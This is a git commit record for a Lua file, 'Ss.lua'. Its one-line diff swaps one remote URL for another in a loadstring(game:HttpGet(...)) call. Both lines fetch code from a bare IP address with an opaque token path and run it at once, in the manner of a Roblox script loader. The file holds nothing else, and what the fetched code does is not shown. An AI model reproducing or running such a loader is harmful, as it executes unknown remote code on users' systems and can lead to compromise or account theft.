3033c9e6904061e3331168cdf53560564b9fd0d5
TakZ-bit <tak72086@gmail.com>
2026-06-23 19:23:07 +0630

    Update Ss.lua

--- Ss.lua
+++ Ss.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://72.56.64.162/V0UbRamiyollv4K4zavWuyYIrOrtu2wqrW9dwDyTK5lQxyEc3gC2twFdfrB1DfzjESsrkPhAI7O5Kqma"))()
+loadstring(game:HttpGet("http://72.56.64.162/IO9Muh0Aty8c7aFtGzBfPn8Q20b4W60UKCOtm94EKmVPNWexgphBj3nNbIWBptqe4bot2fXtYdCyzipS"))()
